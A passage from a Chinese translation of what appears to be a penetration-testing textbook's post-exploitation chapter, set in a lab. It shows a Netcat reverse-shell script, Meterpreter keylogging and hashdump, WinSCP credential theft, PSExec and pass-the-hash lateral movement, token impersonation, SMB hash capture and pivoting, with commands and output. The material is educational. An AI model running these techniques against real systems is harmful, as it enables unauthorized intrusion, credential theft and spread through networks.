  \ 系统默认安装了 `Netcat`，因此我们可以创建一个简单的 `Bash` 脚本来连接到我们 Kali 系统上的监听器，正如第 2 章 中讨论的。这是脚本：\n\
  \n```\ngeorgia@ubuntu:~$ cat /tmp/run\n#!/bin/bash\nnc 192.168.20.9 12345 -e /bin/bash\n\
  ```\n\n在运行漏洞之前，我们需要在 Kali 系统上设置一个监听器来捕获传入的 Netcat shell。\n\n```\nroot@kali:~# nc\
  \ -lvp 12345\n```\n\n最后，我们准备好运行编译后的漏洞了。记住将之前找到的 udev netlink socket PID 作为参数传递。\n\
  \n```\ngeorgia@ubuntu:~$ ./exploit 2468\n```\n\nLinux 目标机器上似乎没有发生什么，但如果我们回到 Kali\
  \ 的 Netcat 监听器，就会获得连接。如示例 13-17 所示，`whoami` 命令告诉我们现在拥有 root 权限。\n\n### 示例 13-17.\
  \ 获取权限\n\n```\nroot@kali:~# nc -lvp 12345\nlistening on [any] 12345\n192.168.20.11:\
  \ inverse lookup failed: Unknown server error : Connection timed out\nconnect to\
  \ [192.168.20.9] 33191\nwhoami\nroot\n```\n\n我们通过公共漏洞成功提升了权限。\n\n## 本地信息收集\n\n一旦进入系统，我们应该检查是否存在任何敏感信息，例如明文存储密码或使用弱哈希算法的软件、专利数据或源代码、客户信用卡信息或\
  \ CEO 的电子邮件账户。这些都是提交给客户报告的有用信息。此外，我们发现任何信息都可能帮助我们进入网络中其他更大的系统。\n\n我们将在本章稍晚时候讨论如何在系统之间移动，但现在让我们看看在本地系统中查找信息的有趣方法。\n\
  \n### 搜索文件\n\n我们可以让 `Meterpreter` 搜索有趣的文件。例如，在示例 13-18 中，我告诉 `Meterpreter` 搜索包含\
  \ `password` 的文件名。\n\n### 示例 13-18. 使用 Meterpreter 搜索文件\n\n```\nmeterpreter > search\
  \ -f *password*\n```\n\n### 键盘记录\n\n收集信息的另一种方法是让登录用户提供。Meterpreter 有一个键盘记录器可以监听击键。如这里所示，在我们的\
  \ Ubuntu 会话中启动键盘记录器：\n\n```\nmeterpreter > keyscan_start\n```\n\n要停止键盘记录，在 `Meterpreter`\
  \ 中输入 `keyscan_stop`。\n\n```\nmeterpreter > keyscan_stop\n```\n\n### 收集凭据\n\n在第\
  \ 9 章中，我们处理了来自 Windows、Linux 和 FileZilla 服务器 的密码哈希，但用户本地系统中可能有其他存储的凭据。Metasploit\
  \ 有多个后渗透模块用于收集特定软件的密码，位于 `/usr/share/metasploit-framework/modules/post/windows/gather/credentials/`。在我们的示例中，我们将从\
  \ `WinSCP` 中窃取存储的凭据。\n\n如图 13-1 所示，打开 `WinSCP`，将文件协议设置为 **SCP**，将主机设置为 Ubuntu 目标的\
  \ IP 地址，并将凭据设置为 `georgia:password`。在登录信息下点击**另存为**。\n\n\n\n\n\n系统会提示你输入会话名称，如图 13-2\
  \ 所示。在点击 `OK` 之前，勾选 `Save password` 框。即使 WinSCP 也警告保存密码是一个坏主意。\n\n![Saving credentials\
  \ in WinSCP](img/httpatomoreillycomsourcenostarchimages2030422.png.jpg)图 13-2. 在\
  \ WinSCP 中保存凭证\n\n现在切换回 Kali Linux，并使用模块 `post/windows/gather/credentials/winscp`，如示例\
  \ 13-19 所示。这是一个后（post）模块，你只需要提供的选项是 Windows XP 会话的 ID。\n\n示例 13-19. 从 WinSCP 中窃取存储的凭证\n\
  \n```\nmsf > use post/windows/gather/credentials/winscp\nmsf  post(winscp) > show\
  \ options\n\nModule options (post/windows/gather/credentials/winscp):\n\n   Name\
  \     Current Setting  Required  Description\n   ----     ---------------  --------\
  \  -----------\n   SESSION                   yes       运行此模块的会话。\n\nmsf  post(winscp)\
  \ > set session 1\nsession => 1\nmsf  post(winscp) > exploit\n[*] Looking for WinSCP.ini\
  \ file storage...\n[*] WinSCP.ini file NOT found...\n[*] Looking for Registry Storage...\n\
  [*] Host: 192.168.20.9  Port: 22 Protocol: SSH  Username: georgia  Password: password\
  \ ❶\n[*] Done!\n[*] Post module execution completed\n```\n\n如示例 13-19 所示，该模块发现了我们保存的凭证\
  \ ❶。根据你渗透测试目标运行的软件，可能还有其他凭据收集目标，在实战中非常有用。\n\n### net 命令\n\nWindows `net` 命令允许我们查看和编辑网络信息。通过使用各种选项，我们可以获取有价值的信息。使用\
  \ Meterpreter 命令 shell 到 Windows 命令行 shell，如下所示。\n\n```\nmeterpreter > shell\n--snip--\n\
  Copyright (c) 2009 Microsoft Corporation.  All rights reserved.\nC:\\Windows\\system32>\n\
  ```\n\n`net users` 命令将向我们显示所有本地用户。在该命令以及许多 `net` 命令末尾加上 `/domain` 将显示关于域的信息而不是本地系统的信息，但由于我们的目标没有加入域，我们将坚持使用\
  \ `net users`。\n\n```\nC:\\Windows\\system32> net users\nnet users\nUser accounts\
  \ for \\\\\n------------------------------------------------------------------------------\n\
  Administrator           georgia           secret           Guest\n```\n\n我们还可以使用\
  \ `net localgroup group` 命令查看组的成员员，如示例 13-20 所示。\n\n示例 13-20. 使用 `net` 命令查看本地管理员\n\
  \n```\nC:\\Windows\\system32> net localgroup Administrators\nnet localgroup Administrators\n\
  Alias name     Administrators\nComment        Administrators have complete and unrestricted\
  \ access to the computer/domain\nMembers\n-----------------------------------------------------------------------------------------------\n\
  Administrator\ngeorgia\nsecret\nThe command completed successfully.\n```\n\n要退出\
  \ shell 并返回 Meterpreter，输入 `exit`。\n\n这些只是一些用 `net` 命令的例子。我们将在本章后面介绍如何使用 `net` 命令添加用户。\n\
  \n### 另一种进入方式\n\n在第 5 章中，我们使用 Nmap 运行了 UDP 扫描。根据定义，UDP 扫描不如 TCP 扫描精确。例如，Windows\
  \ XP 目标上的 69/UDP 端口（传统上 TFTP 的端口）在我们的 UDP Nmap 扫描中返回了 `open|filtered`。由于我们的扫描没有收到任何响应，尚不清楚那里是否有程序在监听。在不对\
  \ TFTP 服务器进行模糊测试并可能导致崩溃的情况下，很难确定运行了哪种 TFTP 软件。现在我们有了系统的访问权限，可以进一步调查运行中的软件，以寻找我们可能错过的任何漏洞。\n\
  \n### 注意事项\n\n在本章早期，我们使用 Meterpreter `ps` 命令查看 Windows XP 目标上的所有运行进程。其中之一是 `3CTftpSvc.exe`，它是\
  \ 3Com TFTP 服务的旧版本，在 TFTP 长传输模式下存在缓冲区溢出漏洞。（我们将在第 19 章中手动编写此问题的漏洞，但也有针对该问题的 Metasploit\
  \ 模块。）尽管攻击者很难远程识别这个问题，但该软件仍然存在漏洞，我们应该将其包含在渗透报告中。\n\n你可能在获得系统访问权限后才会发现面向网络的漏洞。如果不向服务器发送随机的\
  \ TFTP 输入并分析结果，我们很难发现这个问题。\n\n### 检查 Bash 历史\n\n在 Linux 系统中寻找潜在感兴趣信息的一个地方是用户的 Bash\
  \ 历史。当 Bash shell 关闭时，已执行的命令会被写入用户主目录下的名为 `.bash_history` 的文件中。这里展示了一个可能有些刻意的例子，即用户的密码以明文形式保存在\
  \ Bash 历史文件中。\n\n```\ngeorgia@ubuntu:~$ cat .bash_history\nmy password is password\n\
  --snip--\n```\n\n## 横向移动\n\n一旦我们获得了网络环境中一个系统的访问权限，我们是否能利用它来访问其他系统及其敏感数据呢？如果我们被利用的系统是一个域的成员，我们完全尝试破解域帐户，或者理想情况下获得域管理员权限，这样我们就可以登录并管理域中的所有系统。\n\
  \n但即使你无法控制域，如果这些系统都是从同一个系统安装镜像安装，并且具有从未更改过的本地管理员密码，你仍然可能访问该域中的系统。如果我们能破解一台机器的密码，我们可能可以在没有域权限的情况下登录环境中的许多机器。此外，如果用户在多个系统上都有帐户，他可能在每个系统上使用相同的密码，这可能允许我们使用环境中其他地方发现的凭据登录。（良好的密码策略有助于防止此类漏洞，但即使在高安全环境中，密码通常是最薄弱的环节。）\n\
  \n让我们来看几种将一个系统的访问权限转换为多个系统权限的技术。\n\n### PSExec\n\nPSExec 技术源于 20 世纪 90 年代的 Sysinternals\
  \ Windows 管理工具集。该工具通过使用有效凭据连接到 Windows XP SMB 服务器上的 `ADMIN$` 共享来工作。PSExec 将 Windows\
  \ 服务执行文件上传到 `ADMIN$` 共享，然后使用远程过程调用 (RPC) 连接到 Windows 服务管理器启动可执行服务。该服务随后设置 SMB 命名\
  \ `pipe` 以发送命令并远程控制目标系统。\n\nMetasploit 模块 `exploit/windows/smb/psexec` 实现了非常相似的技术。该模块要求目标运行\
  \ SMB 服务器以及访问 `ADMIN$` 共享的凭据。\n\n在第 9 章中，我们破解了 Windows XP 目标用户的密码哈希。你可以想象使用发现的凭据和\
  \ PSExec 来访问额外的系统。在使用 PSExec 模块时使用凭据 `georgia:password`，如示例 13-21 所示。\n\n示例 13-21.\
  \ 使用 PSExec 模块\n\n\n\n\n\n```\nmsf > use exploit/windows/smb/psexec\nmsf exploit(psexec)\
  \ > show options\n\nModule options (exploit/windows/smb/psexec):\n\n   Name    \
  \   Current Setting  Required  Description\n   ----       ---------------  --------\
  \  -----------\n   RHOST                       yes       目标地址\n   RPORT      445\
  \              yes       设置 SMB 服务端口\n   SHARE      ADMIN$           yes       要连接的共享，，可以是管理员共享\n\
  \                                           (ADMIN$,C$,...)或普通的读/写文件夹共享\n   SMBDomain\
  \  WORKGROUP        no        用于认证的 Windows 域\n   SMBPass                     no\
  \        指定用户名的密码\n   SMBUser                     no        用于认证的用户名\n\nmsf exploit(psexec)\
  \ > set RHOST 192.168.20.10\nRHOST => 10.0.1.13\nmsf exploit(psexec) > set SMBUser\
  \ georgia❶\nSMBUser => georgia\nmsf exploit(psexec) > set SMBPass password❷\nSMBPass\
  \ => password\nmsf exploit(psexec) > exploit\n[*] Started reverse handler on 192.168.20.9:4444\n\
  [*] Connecting to the server...\n[*] Authenticating to 192.168.20.10:445|WORKGROUP\
  \ as user 'georgia'...\n[*] Uploading payload...\n[*] Created \\KoMknErc.exe...\n\
  --snip--\n[*] Meterpreter session 6 opened (192.168.20.9:4444 -> 192.168.20.10:1173)\
  \ at 2015-08-14 14:13:40 -0400\n```\n\n除了 `RHOST` 之外，我们还需要告诉模块使用哪个 `SMBDomain`、`SMBUser`\
  \ 和 `SMBPass`。我们的 Windows XP 目标不是域成员，因此可以将 `SMBDomain` 选项保持默认值 `WORKGROUP`。\n\n\
  将 `SMBUser` 设置为 `georgia` ❶并将 `SMBPass` 设置为 `password` ❷，这是我们发现的凭据。然后运行利用模块。该模块将所选的\
  \ payload（在此情况下为默认的 `windows/meterpreter/reverse_tcp`）嵌入到 Windows 服务映像的可执行文件中。在上传可执行文件并联系\
  \ Windows 服务控制管理器后，服务会将 shellcode 复制到服务进程的可执行内存中，并将执行重定向到 payload。因此，我们的 payload\
  \ 运行并连接到 Kali 上的 Metasploit 监听器。尽管我们是以用户 `georgia` 登录的，但由于 payload 是作为系统服务运行的，我们的会话自动拥有系统权限。\n\
  \n### 注意\n\n这就是为什么我们在第 1 章 中更改了 Windows XP 安全策略。如果 Windows XP 是域成员，我们可以填充 `SMBDomain`\
  \ 选项，并使用 `PSExec` 在任何域用户为本地管理员的系统上获取 System 权限。这是在网络中移动并寻找感兴趣的信息、额外的密码哈希和更多漏洞的极佳方法。\n\
  \n### 传递哈希值 (Pass the Hash)\n\n我们之前的攻击依赖于能够反转密码哈希并获取用户账户的明文密码。当然，在我们 Windows XP\
  \ 目标的情况下，这是轻而易举的，因为它使用了完全可以破解的 LM 哈希算法。\n\n在第 9 章中，我们学习到，当我们只有密码的 NTLM 用户认证哈希而不是较弱的\
  \ LM 版本时，我们在合理时间内反转哈希的能力取决于密码的弱点、我们的字典词表列表的强度，甚至是密码破解程序所采用的算法。如果我们无法反转密码哈希，那么使用明文凭据登录其他系统将非常困难。\n\
  \n`PSExec` 再次来得救急。当用户通过 `SMB` 登录时，其密码不会以明文发送到目标。相反，目标系统会发出一个挑战，只有拥有正确密码的人才能回答。在这种情况下，挑战的答案是\
  \ LM 或 NTLM 哈希后的密码，具体取决于实现方式。\n\n当你登录到远程系统时，你的 Windows 应用程序会调用实用程序对密码进行哈希处理，该哈希会被发送到远程系统进行认证。远程系统假设，如果你发送了正确的哈希，你就一定拥有访问正确明文密码的权限——毕竟，单向哈希函数的基本原理之一如此。你能想到某种场景，你可能拥有密码哈希但没有明文密码吗？\n\
  \n在第 9 章中，我们能够反转目标系统上所有的密码哈希。此外，在我们的 Windows XP 目标上，无论密码强度如何，我们都能反转 LM 哈希。但让我们模拟一种只有密码哈希的情况，如示例\
  \ 13-22 中 Meterpreter 的 `hashdump` 命令所示。\n\n示例 13-22. 使用 `hashdump`\n\n```\nmeterpreter\
  \ > hashdump\nAdministrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::\n\
  georgia:1003:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::\n\
  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n\
  HelpAssistant:1000:93880b42019f250cd197b67718ac9a3d:86da9cefbdedaf62b66d9b2fe8816c1f:::\n\
  secret:1004:e52cac67419a9a22e1c7c53891cb0efa:9bff06fe611486579fb74037890fda96:::\n\
  SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:6f552ba8b5c6198ba826d459344ceb14:::\n\
  ```\n\n### 注意\n\n在较新的 Windows 操作系统上使用 Meterpreter `hashdump` 命令时，可能会发现它失败了。另一种方案是后渗透模块：`post/windows/gather/hashdump`。甚至还有\
  \ `post/windows/gather/smart_hashdump`，它不仅可以收集本地哈希，如果你利用了域控制器，还可以收集活动目录哈希。因此，如果在渗透测试初期你没有成功导出密码哈希，请探索其他选项。\n\
  \n让我们使用 Metasploit 的 `PSExec` 模块来利用 `SMB` 认证机制以及一种名为*传递哈希值 (Pass the Hash)* 的技术。不要将\
  \ `SMBPass` 选项设置为 `georgia` 的密码，而是从示例 13-23 的 `hashdump` 中复制 `georgia` 的 LM 和 NTLM\
  \ 哈希作为 `SMBPass` 选项。\n\n示例 13-23. 传递哈希值\n\n```\nmsf exploit(psexec) > set SMBPass\
  \ e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c\nSMBPass =>\
  \ e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c\nmsf exploit(psexec)\
  \ > exploit\n--snip--\n[*] Meterpreter session 7 opened (192.168.20.9:4444 -> 192.168.20.10:1233)\
  \ at 2015-08-14 14:17:47 -0400\n```\n\n我们再次能够使用 `PSExec` 获取 Meterpreter 会话。即使不知道明文密码，仅凭密码哈希也足以通过\
  \ `PSExec` 获取环境中其他系统的访问权限。\n\n### SSHExec\n\n就像 Windows 的 `PSExec` 一样，如果我们拥有一组有效的凭据（这些凭据可能在环境中其他有效），就可以使用\
  \ `SSHExec` 穿于环境中的 Linux 系统。Metasploit 模块 `multi/ssh/sshexec` 及其选项在示例 13-24 中所示。\n\
  \n\n\n\n\n```\nmsf > use exploit/multi/ssh/sshexec\nmsf exploit(sshexec) > show\
  \ options\n\nModule options (exploit/multi/ssh/sshexec):\n\n   Name      Current\
  \ Setting  Required  Description\n   ----      ---------------  --------  -----------\n\
  \   PASSWORD                   yes       身份验证的密码。\n   RHOST                    \
  \  yes       目标地址\n   RPORT     22               yes       目标端口\n   USERNAME  root\
  \             yes       用于身份验证的用户。\n--snip--\nmsf exploit(sshexec) > set RHOST 192.168.20.11\n\
  RHOST => 192.168.20.11\nmsf exploit(sshexec) > set USERNAME georgia❶\nUSERNAME =>\
  \ georgia\nmsf exploit(sshexec) > set PASSWORD password❷\nPASSWORD => password\n\
  msf exploit(sshexec) > show payloads\n--snip--\nlinux/x86/meterpreter/reverse_tcp\
  \    normal  Linux Meterpreter, Reverse TCP Stager\n--snip--\nmsf exploit(sshexec)\
  \ > set payload linux/x86/meterpreter/reverse_tcp\npayload => linux/x86/meterpreter/reverse_tcp\n\
  msf exploit(sshexec) > set LHOST 192.168.20.9\nLHOST => 192.168.20.9\nmsf exploit\
  \ > exploit\n\n[*] Started reverse handler on 192.168.20.9:4444\n--snip--\n[*] Meterpreter\
  \ session 10 opened (192.168.20.9:4444 -> 192.168.20.11:36154) at 2015-03-25 13:43:26\
  \ -0400\nmeterpreter > getuid\nServer username: uid=1000, gid=1000, euid=1000, egid=1000,\
  \ suid=1000, sgid=1000\nmeterpreter > shell\nProcess 21880 created.\nChannel 1 created.\n\
  whoami\ngeorgia\n```\n\n在这个示例中，我们通过在第 9 章 中破解它们，获取了 `georgia:password` 凭据。尽管在这种情况下我们只是再次登录到同一台主机（类似于我们在\
  \ PSExec 中所的操作），但我们可以将这种相同的技术用于同一环境中拥有 `georgia` 账户的其他主机。\n\n与 `PSExec` 一样，我们需要有效的凭据来通过身份验证。我们将\
  \ `USERNAME` 设置为 `georgia` ❶，`PASSWORD` 设置为 `password` ❷，然后选择 `linux/x86/meterpreter/reverse_tcp`\
  \ 作为负载。\n\n与 `PSExec` 不同（后者会上传二进制文件并将其作为 System 服务运行，自动赋予我们 System 权限），使用 `SSHExec`\
  \ 时，我们仍然是用户 `georgia`。你可以看到这种利用如何成为在环境中横移动的快速方法，以寻找其他 Linux 系统上的额外信息和漏洞。\n\n###\
  \ 令牌仿骗 (Token Impersonation)\n\n既然我们知道可能甚至不需要明文密码即可访问其他系统，那么是否存在任何一种我们可能甚至不需要密码哈希值的情况？\n\
  \n一个有趣的 Windows 安全结构是 `令牌 (tokens)` 的概念。令牌主要用于访问控制。根据进程的令牌，操作系统可以决定哪些资源和操作应对其可用。\n\
  \n将令牌想象成一种临时钥匙，它可以让你访问某些资源，而无需每次执行特权操作时输入密码。当用户交互式登录系统时（例如直接通过控制台或从远程桌面登录），系统会创建一个\
  \ `委托令牌 (delegation token)`。\n\n委托令牌允许进程仿装本地系统以及网络（例如域中的其他系统）上的令牌。委托令牌包含凭据，并可用于与使用这些凭据的其他系统（如域控制器）进行验证。令牌会持续到重启，即使用户注销，其令牌仍然存在于系统中，直到系统关闭。如果我们可以在系统上窃取另一个令牌，我们就有可能获得额外的权限，甚至访问额外的系统。\n\
  \n### Incognito (隐身)\n\n我们正处于一个被攻破的系统：我们的 Windows XP 目标。系统上有哪些令牌，我们如何窃取它们？`Incognito`\
  \ 最初是安全研究人员为了研究使用令牌窃取进行权限提升而开发的独立工具，但此后被作为扩展添加到 Meterpreter 中。Incognito 将帮助我们枚举并窃取系统上所有的令牌。\n\
  \nIncognito 默认不会加载到 Meterpreter 中，但我们可以使用 `load` 命令添加它，如下所示。使用你当前以系统身份运行的 Meterpreter\
  \ 会话之一，或使用权限提升来提高你的权限（`System` 可以访问目标上的所有令牌）。\n\n```\nmeterpreter > load incognito\n\
  Loading extension incognito...success.\n```\n\n在使用 Incognito 之前，在你的 Windows XP 目标上切换用户并使用密码\
  \ `Password123` 登录为 `secret`。这次登录将在目标上上创建一个委托令牌供我们仿骗。当我们列出令牌时，Incognito 会搜索系统上的所有句柄，通过低级\
  \ Windows API 调用来确定哪些句柄属于令牌。要查看 Meterpreter Incognito 可用的所有用户令牌，请输入命令 `list_tokens\
  \ -u`，如示例 13-25 所示。\n\n示例 13-25. 使用 Incognito 枚举令牌\n\n```\nmeterpreter > list_tokens\
  \ -u\n\nDelegation Tokens Available (可用委托令牌)\n========================================\n\
  BOOKXP\\georgia\nBOOKXP\\secret\nNT AUTHORITY\\LOCAL SERVICE\nNT AUTHORITY\\NETWORK\
  \ SERVICE\nNT AUTHORITY\\SYSTEM\n```\n\n我们看到了 `georgia` 和 `secret` 的令牌。让我们尝试窃取 `secret`\
  \ 的委托令牌，从而有效地获得该用户的权限。使用 `impersonate_token` 命令来窃取令牌，如示例 13-26 所示。（注意，我们使用两个反斜杠来转义域（在此例为本地机器名）与用户名之间的反斜杠。）\n\
  \n示例 13-26. 使用 Incognito 窃取令牌\n\n```\nmeterpreter > impersonate_token BOOKXP\\\\\
  secret\n[+] Delegation token available\n[+] Successfully impersonated user BOOKXP\\\
  secret\nmeterpreter > getuid\nServer username: BOOKXP\\secret\n```\n\n窃取 `secret`\
  \ 的令牌后，如果我们运行 `getuid`，应该能看到我们现在实际上是 `secret` 用户。这在域环境中特别有趣：如果 `secret` 是域管理员，我们现在也是域管理员，并可以创建新的域管理员账户或更改域管理员密码等操作。（我们将在持久化\
  \ 中学习从命令行添加账户。）\n\n### SMB Capture (SMB Capture)\n\n让我们来看看令牌窃取的另一个有趣的后果。在域中，域用户的密码哈希仅存储在域控制器上，这意味着在受攻击系统上运行\
  \ `hashdump` 只能获得本地用户的密码哈希。我们没有设置域，因此 `secret` 的密码哈希存储在本地，但假设 `secret` 是一个域用户。让我们看看在不访问域控制器的情况下，通过将哈希传递到我们控制的\
  \ SMB 服务器进行捕捉的方法。\n\n打开另一个 Msconsole 实例，并使用 `auxiliary/server/capture/smb` 模块设置\
  \ SMB 服务器并捕获任何身份尝试。与我们在第 10 章中学习的客户端攻击模块一样，该模块并不直接攻击另一个系统；它只是设置了服务器并等待。如示例 13-27\
  \ 所示设置模块选项。\n\n\n\n\n\n```\nmsf > use auxiliary/server/capture/smb\nmsf auxiliary(smb)\
  \ > show options\nModule options (auxiliary/server/capture/smb):\n   Name      \
  \  Current Setting   Required  Description\n   ----        ---------------   --------\
  \  -----------\n   CAINPWFILE                    no        The local filename to\
  \ store the hashes in Cain&Abel\n                                             format\n\
  \   CHALLENGE   1122334455667788  yes       The 8 byte challenge\n   JOHNPWFILE\
  \                    no        The prefix to the local filename to store the hashes\n\
  \                                             in JOHN format\n   SRVHOST     0.0.0.0\
  \           yes       The local host to listen on. This must be an address\n   \
  \                                          on the local machine or 0.0.0.0\n   SRVPORT\
  \     445               yes       The local port to listen on.\n   SSL         false\
  \             no        Negotiate SSL for incoming connections\n   SSLCert     \
  \                  no        Path to a custom SSL certificate (default is\n    \
  \                                         randomly generated)\n   SSLVersion  SSL3\
  \              no        Specify the version of SSL that should be used\n      \
  \                                       (accepted: SSL2, SSL3, TLS1)\nmsf auxiliary(smb)\
  \ > set JOHNPWFILE /root/johnfile❶\nJOHNPWFILE => johnfile\nmsf auxiliary(smb) >\
  \ exploit\n```\n\n你可以将结果保存到 `CAINPWFILE` 或 `JOHNPWFILE` 中，这会将捕获到的哈希分别以 Windows 的\
  \ Cain and Abel 密码工具和 John the Ripper 预期的格式保存。让我们将其设置为 `JOHNPWFILE` ❶，因为我们在第 9 章中学习了如何使用\
  \ John。\n\n现在回到你在上一节中的 Meterpreter 会话（你在那里伪装了 `secret` 的令牌），并进入 shell，如下所示。由于我们已经窃了\
  \ `secret` 的令牌，此 shell 将以 `secret` 身份运行。由于委托令牌包含与其他系统进行身份验证的凭据，我们将使用 Windows 命令\
  \ `net use` 尝试与我们的伪造 SMB 捕获服务器进行身份验证。\n\n连接到 Kali SMB 服务器上你喜欢的任何共享。登录将失败，但损害已经造成。\n\
  \n```\nmeterpreter > shell\nC:\\Documents and Settings\\secret>net use \\\\192.168.20.9\\\
  blah\n```\n\n回到你的 SMB Capture Msfconsole 窗口，你应该看到你已经捕获了一组密码哈希。\n\n```\n[*] SMB Captured\
  \ - 2015-08-14 15:11:16 -0400\nNTLMv1 Response Captured from 192.168.20.10:1078\
  \ – 192.168.20.10\nUSER:secret DOMAIN:BOOKXP OS:Windows 2002 Service Pack 3 2600\
  \ LM:Windows 2002 5.1\nLMHASH:76365e2d142b5612338deca26aaee2a5d6f3460500532424\n\
  NTHASH:f2148557db0456441e57ce35d83bd0a27fb71fc8913aa21c\n```\n\n### 注意\n\n这个练习可能会有些不稳定，特别是在没有\
  \ Windows 域的情况下。你可能会在捕获哈希时遇到困难，而是得到类似的内容：\n\n```\n[*] SMB Capture - Empty hash captured\
  \ from 192.168.20.10:1050 - 192.168.20.10 captured, ignoring ...\n```\n\n这是一个常见问题。只需尝试理解这些概念，这样你就可以部署了\
  \ Windows 域的客户端环境中尝试它们。\n\n结果以正确的格式保存在 `auxiliary/server/capture/smb` 模块的 `JOHNPWFILE`\
  \ 选项中。例如，由于我们将 `JOHNPWFILE` 设置为 `/root/johnfile`，因此传递给 John 的文件就是 `/root/johnfile_netntlm`。当你将这些哈希与示例\
  \ 13-22 中用 `hashdump` 出的哈希进行对比时，你会发现 `secret` 的哈希是不同的。发生了什么？事实证明，这些哈希是 NETLM 和 NETNTLM\
  \ 的，它们与我们在第 9 章中处理的普通 LM 和 NTLM Windows 哈希有所不同。当你查看 `JOHNPWFILE` 时，你会发现它的格式与我们之前看到的\
  \ John the Ripper 格式不同。\n\n```\nsecret::BOOKXP:76365e2d142b5612338deca26aaee2a5d6f3460500532424:f2148557db0456441e57ce35d83bd0a27fb71fc8913aa21c:1122334455667788\n\
  ```\n\n特别是，哈希项记录了 Metasploit 中设置的 `CHALLENGE` 选项。虽然用户 `secret` 在我们的 Windows XP 目标上有本地哈希，这可以让我们省去破解\
  \ NETLM 和 NETNTLM 哈希的麻烦，但在处理域用户账户时，获取密码哈希是一个非常有用的技巧，因为这些账户的密码哈希仅存储在域控制器上。\n\n##\
  \ 枢纽 (Pivoting)\n\n现在让我们看看是否可以使用对系统的访问来进入另一个网络。通常，一个组织只有少数面向 Internet 的系统——即需要向\
  \ Internet 提供的服务，如 Web 服务器、电子邮件服务器、VPN 等。这些服务可能由 Google 或 GoDaddy 之类的提供商托管，也可能是在内部托管的。如果是在内部托管，那么从\
  \ Internet 访问它们可能会让你访问内部网络。理想情况下，它们的内部网络将根据业务部门、敏感级别等进行分段，使得访问某一台机器不会导致对企业中所有机器的直接访问。\n\
  \n### 注意\n\n面向 Internet 的系统可能是双网卡的（dual homed），或者是多个网络的成员，即 Internet 和内部网络。安全最佳实践是将双网卡系统隔离在非军事化区，使其与敏感的内部网络资源分离，但我曾为在内部域中拥有面向系统的系统的客户进行过渗透测试。我所做的只是利用他们的\
  \ Web 应用程序（管理员账户有一个默认密码），并像我们在第 8 章中对 XAMPP 那样上传一个 PHP shell，突然我就访问了他们内部域中的一个系统。希望你的大多数客户在攻破边界和访问域之间还需要几个步骤。\n\
  \n当我们在第 1 章中设置 Windows 7 目标时，我们为它分配了两个虚拟网络适配器。我们将一个连接到桥接网络，使其能够与其他目标以及我们的 Kali 虚拟机通信。另一个虚拟适配器连接到仅主机网络（host-only）。对于这个练习，请将\
  \ Windows XP 目标切换到仅主机网络，以便 Kali 系统无法再访问它。（有关更改虚拟网络设置的更多信息，请参见创建 Windows 7 目标。）\n\
  \n虽然这是一个 Windows 系统，但 Meterpreter 允许我们使用 `ifconfig` 命令查看网络信息。如示例 13-28 所示，Windows\
  \ 7 目标属于两个网络：192.168.20.0/24 网络（包含我们的 Kali 系统）以及 172.16.85.0/24 网络（Kali 系统无法访问）。\n\
  \n我们无法直接从 Kali 攻击 172.16.85.0 网络中的任何系统。但是，由于我们访问了 Windows 7 目标，我们可以将其作为跳板，即*枢纽 (pivot)*，来进一步探索这第二个网络，如图\
  \ 13-3 所示。\n\n![Pivoting through an exploited system](img/httpatomoreillycomsourcenostarchimages2030424.png.jpg)图\
  \ 13-3. 渗透被攻击的系统\n\n\n\n\n\n在此时，我们可以开始将黑客工具上传到 Windows 7 目标机器以开始对 172.16.85.0 网络进行渗透测试，但这种尝试可能会被防病毒软件捕获，而且我们必须清理留下的摊子。Metasploit\
  \ 为我们提供了另一种选择：我们可以将发往目标网络的所有流量通过一个打开的 Metasploit 会话进行路由。\n\n### 在 Metasploit 中添加路由\n\
  \nMetasploit 中的 `route` 命令告诉它应该将流量路由到哪里。我们不是将流量路由到 IP 地址，而是通过特定的打开会话发送发往某个网络的流量。在这种情况下，我们希望将所有发往\
  \ 172.16.85.0 网络的流量通过 Windows 7 会话发送。Metasploit 中路由 命令 命令的语法为 `route add network\
  \ <subnet> mask > <session id>`。\n\n```\nmsf > route add 172.16.85.0 255.255.255.0\
  \ 2\n```\n\n现在，我们从 Metasploit 发送到 172.16.85.0 网络的任何流量将自动通过 Windows 7 会话（在我的案例中是会话\
  \ 2）。我们可以将 `RHOST` 或 `RHOSTS` 等选项设置为此网络中的系统，Metasploit 将把流量送到正确的地方。\n\n### Metasploit\
  \ 端口扫描器\n\n我们在第 5 章中进行信息收集时，做的第一件事之一就是使用 Nmap 对目标进行端口扫描。我们无法在使用 Metasploit 路由的情况下外部工具，但幸运的是\
  \ Metasploit 有一些我们可以替代的端口扫描模块，例如 `scanner/portscan/tcp` 模块，它将执行简单的 TCP 端口扫描，如示例\
  \ 13-29 所示。\n\n示例 13-29. 使用 Metasploit 进行端口扫描\n\n```\nmsf > use scanner/portscan/tcp\n\
  msf  auxiliary(tcp) > show options\nModule options (auxiliary/scanner/portscan/tcp):\n\
  \n   Name         Current Setting  Required  Description\n   ----         ---------------\
  \  --------  -----------\n   CONCURRENCY  10               yes       每个主机检查的并发端口数\n\
  \   PORTS       ❶1-10000          yes       要扫描的端口（例如 22-25,80,110-900）\n   RHOSTS\
  \                        yes       目标地址范围或 CIDR 标识符\n   THREADS      1         \
  \       yes       并发线程数\n   TIMEOUT      1000             yes       毫秒级套接字连接超时\n\
  msf  auxiliary(tcp) > set RHOSTS 172.16.85.190\nrhosts => 172.16.85.190\nmsf  auxiliary(tcp)\
  \ > exploit\n[*] 172.16.85.190:25 - TCP OPEN\n[*] 172.16.85.190:80 - TCP OPEN\n\
  [*] 172.16.85.190:139 - TCP OPEN\n[*] 172.16.85.190:135 - TCP OPEN\n[*] 172.16.85.190:180\
  \ - TCP OPEN\n--snip--\n```\n\n像往常为辅助模块一样设置 `RHOSTS` 选项。默认情况下，Metasploit 扫描端口 1-10000\
  \ ❶，但如果你愿意也可以更改此选项。\n\n虽然 Metasploit 的端口扫描器没有 Nmap 那么强大，但我们至少可以看到 SMB 端口是开放的。从这里，我们可以运行\
